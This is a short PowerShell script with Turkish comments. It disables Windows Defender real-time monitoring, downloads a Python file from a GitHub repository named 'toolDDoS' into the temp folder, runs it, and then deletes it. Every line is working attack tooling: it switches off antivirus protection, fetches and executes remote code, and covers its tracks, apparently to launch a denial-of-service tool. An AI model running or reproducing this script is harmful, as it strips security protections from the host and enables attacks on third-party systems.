Set-MpPreference -DisableRealtimeMonitoring $true
$python = "python"  # Python PATH’te yoksa tam yolunu yaz
$url = "https://raw.githubusercontent.com/doguiaste/toolDDoS/main/start.py"

# Geçici dosya yolu
$tmp = "$env:TEMP\start.py"

Invoke-RestMethod -Uri $url -OutFile $tmp
& $python $tmp
Remove-Item $tmp
